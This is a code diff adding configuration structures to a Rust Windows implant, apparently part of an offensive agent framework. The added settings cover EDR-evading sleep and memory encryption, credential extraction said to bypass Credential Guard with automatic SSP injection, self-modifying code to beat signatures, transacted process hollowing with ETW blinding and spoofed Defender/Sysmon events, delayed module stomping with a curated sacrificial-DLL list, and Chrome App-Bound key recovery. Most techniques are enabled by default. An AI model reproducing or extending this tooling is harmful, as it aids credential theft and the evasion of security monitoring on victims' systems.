@@ -53,6 +53,9 @@ pub enum ExecStrategy {
 pub enum SleepMethod {
     Ekko,
     Foliage,
+    /// Cronus-style waitable-timer sleep using NtSetTimer instead of
+    /// NtDelayExecution.  Less commonly hooked by EDR.
+    Cronus,
     #[default]
     Standard,
 }
@@ -202,6 +205,330 @@ fn default_base_interval() -> u64 {
 }
 fn default_jitter_percent() -> u32 {
     20
+}
+
+/// Configuration for the Evanesco continuous-memory-hiding subsystem.
+///
+/// When the `evanesco` feature is enabled, all enrolled memory pages are
+/// kept in an encrypted / `PAGE_NOACCESS` state at all times — not just
+/// during sleep.  Per-page RC4 encryption is used for fast frequent
+/// encrypt/decrypt cycles, while the existing XChaCha20-Poly1305 sleep
+/// encryption continues to handle the full sweep during sleep.
+///
+/// A background re-encryption thread periodically scans tracked pages and
+/// re-encrypts any that have been idle longer than `idle_threshold_ms`.
+/// A VEH handler auto-decrypts pages on `STATUS_ACCESS_VIOLATION`.
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
+#[serde(rename_all = "kebab-case")]
+pub struct EvanescoConfig {
+    /// How long (in milliseconds) a decrypted page may remain idle before
+    /// the background re-encryption thread encrypts it again.  Lower values
+    /// reduce the window of exposure but increase CPU overhead.  Default: 100 ms.
+    #[serde(default = "default_evanesco_idle_threshold_ms")]
+    pub idle_threshold_ms: u64,
+    /// Interval (in milliseconds) between background re-encryption scans.
+    /// Each scan checks all tracked pages and re-encrypts those idle beyond
+    /// `idle_threshold_ms`.  Default: 50 ms.
+    #[serde(default = "default_evanesco_scan_interval_ms")]
+    pub scan_interval_ms: u64,
+}
+
+fn default_evanesco_idle_threshold_ms() -> u64 {
+    100
+}
+fn default_evanesco_scan_interval_ms() -> u64 {
+    50
+}
+fn default_browser_c4_timeout_secs() -> u64 {
+    60
+}
+
+// ── LSA Whisperer configuration ──────────────────────────────────────────
+
+/// Configuration for the LSA Whisperer credential extraction module.
+///
+/// LSA Whisperer interacts with LSA authentication packages (SSPs) through
+/// their documented interfaces, operating entirely within the LSA process's
+/// own security context without needing to read LSASS memory at all.
+/// This bypasses Credential Guard and RunAsPPL.
+#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
+#[serde(rename_all = "kebab-case")]
+pub struct LsaWhispererConfig {
+    /// Maximum time (in seconds) to wait for the untrusted LSA enumeration
+    /// to complete.  Default: 30 s.
+    #[serde(default = "default_lsa_whisperer_timeout_secs")]
+    pub timeout_secs: u64,
+    /// Maximum number of credentials to buffer when using SSP injection
+    /// (admin method).  Default: 1024.
+    #[serde(default = "default_lsa_whisperer_buffer_size")]
+    pub buffer_size: usize,
+    /// Whether to automatically attempt SSP injection if running elevated.
+    /// Default: true.
+    #[serde(default = "default_lsa_whisperer_auto_inject")]
+    pub auto_inject: bool,
+}
+
+fn default_lsa_whisperer_timeout_secs() -> u64 {
+    30
+}
+fn default_lsa_whisperer_buffer_size() -> usize {
+    1024
+}
+fn default_lsa_whisperer_auto_inject() -> bool {
+    true
+}
+
+// ── SyscallConfig ───────────────────────────────────────────────────────────
+
+/// Configuration for the indirect dynamic syscall resolution subsystem.
+///
+/// Controls how often cached SSNs are validated against the live ntdll.
+/// Only effective when the agent is compiled with the `direct-syscalls`
+/// feature.
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
+#[serde(rename_all = "kebab-case")]
+pub struct SyscallConfig {
+    /// Number of main-loop iterations between periodic SSN cache validations.
+    /// Each validation cross-references the ntdll PE timestamp and probes
+    /// critical syscalls with invalid parameters.  Default: 100.
+    #[serde(default = "default_syscall_validate_interval")]
+    pub validate_interval: u32,
+}
+
+fn default_syscall_validate_interval() -> u32 {
+    100
+}
+
+impl Default for SyscallConfig {
+    fn default() -> Self {
+        Self {
+            validate_interval: default_syscall_validate_interval(),
+        }
+    }
+}
+
+// ── EvasionTransformConfig ────────────────────────────────────────────────
+
+/// Configuration for the automated EDR bypass transformation engine.
+///
+/// Scans the agent's own compiled `.text` section for byte signatures known
+/// to be detected by EDR (YARA rules, entropy heuristics, known gadget
+/// chains).  When a detected pattern is found, applies semantic-preserving
+/// transformations automatically at runtime: instruction substitution,
+/// register reassignment, nop-sled insertion, constant splitting, and jump
+/// obfuscation.
+///
+/// Only effective when the agent is compiled with the `evasion-transform`
+/// feature (which implies `self-reencode`).
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
+#[serde(rename_all = "kebab-case")]
+pub struct EvasionTransformConfig {
+    /// Enable periodic automatic EDR bypass transformations.  When `false`,
+    /// only on-demand `EvasionTransformScan` / `EvasionTransformRun` commands
+    /// are accepted.  Default: `true`.
+    #[serde(default = "default_true")]
+    pub enabled: bool,
+    /// Interval in seconds between automatic scan-and-transform cycles.
+    /// Each cycle scans `.text` for known signatures and applies up to
+    /// `max_transforms_per_cycle` transformations.  Default: 300 s (5 min).
+    #[serde(default = "default_evasion_transform_scan_interval")]
+    pub scan_interval_secs: u64,
+    /// Maximum number of transformations to apply in a single cycle.
+    /// Limits the scope of each pass to avoid large `.text` perturbations
+    /// that could themselves attract EDR attention.  Default: 12.
+    #[serde(default = "default_evasion_transform_max_per_cycle")]
+    pub max_transforms_per_cycle: u32,
+    /// Shannon entropy threshold above which a `.text` region is flagged as
+    /// suspicious (likely encrypted/packed and already evading signature
+    /// detection).  Regions above this threshold are *skipped* to avoid
+    /// transforming already-safe code.  Range: 0.0–8.0.  Default: 6.8.
+    #[serde(default = "default_evasion_transform_entropy_threshold")]
+    pub entropy_threshold: f64,
+}
+
+fn default_evasion_transform_scan_interval() -> u64 {
+    300
+}
+fn default_evasion_transform_max_per_cycle() -> u32 {
+    12
+}
+fn default_evasion_transform_entropy_threshold() -> f64 {
+    6.8
+}
+
+impl Default for EvasionTransformConfig {
+    fn default() -> Self {
+        Self {
+            enabled: true,
+            scan_interval_secs: default_evasion_transform_scan_interval(),
+            max_transforms_per_cycle: default_evasion_transform_max_per_cycle(),
+            entropy_threshold: default_evasion_transform_entropy_threshold(),
+        }
+    }
+}
+
+// ── NTFS Transaction-Based Process Hollowing ─────────────────────────────────
+
+/// Configuration for the NTFS transaction-based process hollowing injection
+/// variant.  Uses `NtCreateTransaction` + `NtCreateSection` backed by the
+/// transaction, writes payload into a suspended target process, then rolls
+/// back the transaction so the file on disk never existed while the section
+/// mapping in the target remains valid.  Includes ETW blinding: temporarily
+/// patches ETW in the target process and emits fake provider events.
+///
+/// Only effective when compiled with the `transacted-hollowing` feature.
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
+#[serde(rename_all = "kebab-case")]
+pub struct TransactedHollowingConfig {
+    /// Enable the NTFS transaction-based hollowing injection variant.
+    /// When `false`, the technique is excluded from auto-selection and
+    /// direct invocation returns an error.  Default: `true`.
+    #[serde(default = "default_true")]
+    pub enabled: bool,
+    /// Prefer transacted hollowing over standard process hollowing in
+    /// auto-selection ranking.  When `true`, transacted hollowing is
+    /// ranked above `ProcessHollow` (but below pool-party variants).
+    /// Default: `true`.
+    #[serde(default = "default_true")]
+    pub prefer_over_hollowing: bool,
+    /// Enable ETW blinding: temporarily patches `EtwEventWrite` in the
+    /// target process and emits 3–5 fake events with Windows Defender /
+    /// Sysmon provider GUIDs before restoring.  Default: `true`.
+    #[serde(default = "default_true")]
+    pub etw_blinding: bool,
+    /// Maximum time in milliseconds to wait for the NTFS transaction
+    /// rollback to complete before force-closing the transaction handle.
+    /// Default: 5000 ms.
+    #[serde(default = "default_transacted_rollback_timeout_ms")]
+    pub rollback_timeout_ms: u32,
+}
+
+fn default_transacted_rollback_timeout_ms() -> u32 {
+    5000
+}
+
+impl Default for TransactedHollowingConfig {
+    fn default() -> Self {
+        Self {
+            enabled: true,
+            prefer_over_hollowing: true,
+            etw_blinding: true,
+            rollback_timeout_ms: default_transacted_rollback_timeout_ms(),
+        }
+    }
+}
+
+// ── Delayed module-stomp config ─────────────────────────────────────────────
+
+/// Configuration for the delayed module-stomp injection technique.
+///
+/// This technique loads a sacrificial DLL into the target process, waits
+/// for a randomized delay to let EDR initial-scan heuristics pass, then
+/// overwrites the DLL's `.text` section with the payload.  Defeats
+/// timing-based EDR heuristics that flag modules whose code changes
+/// shortly after loading.
+#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
+#[serde(rename_all = "kebab-case")]
+pub struct DelayedStompConfig {
+    /// Enable the delayed module-stomp injection variant.
+    /// When `false`, the technique is excluded from auto-selection and
+    /// direct invocation returns an error.  Default: `true`.
+    #[serde(default = "default_true")]
+    pub enabled: bool,
+    /// Minimum delay in seconds between DLL load and stomp.
+    /// Default: 8 seconds.
+    #[serde(default = "default_min_delay_secs")]
+    pub min_delay_secs: u32,
+    /// Maximum delay in seconds between DLL load and stomp.
+    /// Default: 15 seconds.
+    #[serde(default = "default_max_delay_secs")]
+    pub max_delay_secs: u32,
+    /// Ordered list of candidate sacrificial DLLs to load into the target
+    /// process.  Must NOT already be loaded in the target.  Earlier entries
+    /// are tried first.  The DLL must be present on the target system
+    /// (typically in `C:\Windows\System32\`).
+    /// Default: curated list of ~30 commonly available, low-visibility DLLs.
+    #[serde(default = "default_delayed_stomp_dlls")]
+    pub sacrificial_dlls: Vec<String>,
+    /// Prefer delayed stomp over standard module stomping in auto-selection.
+    /// When `true`, `DelayedModuleStomp` is ranked above `ModuleStomp`.
+    /// Default: `true`.
+    #[serde(default = "default_true")]
+    pub prefer_over_stomp: bool,
+}
+
+fn default_min_delay_secs() -> u32 {
+    8
+}
+
+fn default_max_delay_secs() -> u32 {
+    15
+}
+
+fn default_delayed_stomp_dlls() -> Vec<String> {
+    vec![
+        "version.dll".into(),
+        "dwmapi.dll".into(),
+        "msctf.dll".into(),
+        "uxtheme.dll".into(),
+        "netprofm.dll".into(),
+        "devobj.dll".into(),
+        "cryptbase.dll".into(),
+        "wer.dll".into(),
+        "msimg32.dll".into(),
+        "propsys.dll".into(),
+        "d3d10.dll".into(),
+        "dbgeng.dll".into(),
+        "dbghelp.dll".into(),
+        "winnsi.dll".into(),
+        "iphlpapi.dll".into(),
+        "dnsapi.dll".into(),
+        "mpr.dll".into(),
+        "credui.dll".into(),
+        "winspool.drv".into(),
+        "setupapi.dll".into(),
+        "cfgmgr32.dll".into(),
+        "powrprof.dll".into(),
+        "profapi.dll".into(),
+        "sspicli.dll".into(),
+        "rpcrt4.dll".into(),
+        "bcrypt.dll".into(),
+        "bcryptprimitives.dll".into(),
+        "msvcrt.dll".into(),
+        "ucrtbase.dll".into(),
+        "sechost.dll".into(),
+    ]
+}
+
+impl Default for DelayedStompConfig {
+    fn default() -> Self {
+        Self {
+            enabled: true,
+            min_delay_secs: default_min_delay_secs(),
+            max_delay_secs: default_max_delay_secs(),
+            sacrificial_dlls: default_delayed_stomp_dlls(),
+            prefer_over_stomp: true,
+        }
+    }
+}
+
+impl Default for LsaWhispererConfig {
+    fn default() -> Self {
+        Self {
+            timeout_secs: default_lsa_whisperer_timeout_secs(),
+            buffer_size: default_lsa_whisperer_buffer_size(),
+            auto_inject: default_lsa_whisperer_auto_inject(),
+        }
+    }
+}
+
+impl Default for EvanescoConfig {
+    fn default() -> Self {
+        Self {
+            idle_threshold_ms: default_evanesco_idle_threshold_ms(),
+            scan_interval_ms: default_evanesco_scan_interval_ms(),
+        }
+    }
 }
 
 impl Default for SleepConfig {
@@ -729,6 +1056,50 @@ pub struct Config {
     /// candidates, exclusion patterns, etc.).
     #[serde(default)]
     pub injection: InjectionConfig,
+    /// Configuration for the Evanesco continuous-memory-hiding subsystem.
+    /// Only effective when the agent is compiled with the `evanesco` feature.
+    /// When absent from the TOML file, sensible defaults are used.
+    #[serde(default)]
+    pub evanesco: EvanescoConfig,
+    /// Maximum time (in seconds) the C4 padding-oracle attack may spend
+    /// attempting to recover the Chrome App-Bound Encryption key before
+    /// falling back to elevated strategies.  Default: 60 s.
+    #[serde(default = "default_browser_c4_timeout_secs")]
+    pub browser_c4_timeout_secs: u64,
+    /// Configuration for the LSA Whisperer credential extraction module.
+    /// Interacts with LSA SSP interfaces to extract credentials without
+    /// reading LSASS memory (bypasses Credential Guard and RunAsPPL).
+    /// Only effective when compiled with the `lsa-whisperer` feature.
+    #[serde(default)]
+    pub lsa_whisperer: LsaWhispererConfig,
+    /// Configuration for the indirect dynamic syscall resolution subsystem.
+    /// Controls periodic SSN cache validation and fallback behaviour.
+    /// Only effective when compiled with the `direct-syscalls` feature.
+    #[serde(default)]
+    pub syscall: SyscallConfig,
+    /// Configuration for the automated EDR bypass transformation engine.
+    /// Scans `.text` for known EDR signatures and applies semantic-preserving
+    /// transformations (instruction substitution, register reassignment, nop
+    /// sled insertion, constant splitting, jump obfuscation).
+    /// Only effective when compiled with the `evasion-transform` feature.
+    #[serde(default)]
+    pub evasion_transform: EvasionTransformConfig,
+    /// Configuration for NTFS transaction-based process hollowing.
+    /// Creates an NTFS transaction, writes payload into a transaction-backed
+    /// section, hollows a suspended target process, then rolls back the
+    /// transaction so the on-disk artefact never existed.  Includes ETW
+    /// blinding with spoofed provider GUIDs.
+    /// Only effective when compiled with the `transacted-hollowing` feature.
+    #[serde(default)]
+    pub transacted_hollowing: TransactedHollowingConfig,
+
+    /// Configuration for delayed module-stomp injection.
+    /// Loads a sacrificial DLL, waits for EDR scan window to pass, then
+    /// overwrites the DLL's `.text` section with the payload.  Defeats
+    /// timing-based EDR heuristics.
+    /// Only effective when compiled with the `delayed-stomp` feature.
+    #[serde(default)]
+    pub delayed_stomp: DelayedStompConfig,
 }
 
 /// Per-platform list of persistence mechanisms to install.
@@ -936,6 +1307,13 @@ impl Default for Config {
             p2p_heartbeat_interval_secs: default_p2p_heartbeat(),
             reencode_interval_secs: default_reencode_interval(),
             injection: InjectionConfig::default(),
+            evanesco: EvanescoConfig::default(),
+            browser_c4_timeout_secs: default_browser_c4_timeout_secs(),
+            lsa_whisperer: LsaWhispererConfig::default(),
+            syscall: SyscallConfig::default(),
+            evasion_transform: EvasionTransformConfig::default(),
+            transacted_hollowing: TransactedHollowingConfig::default(),
+            delayed_stomp: DelayedStompConfig::default(),
         }
     }
 }
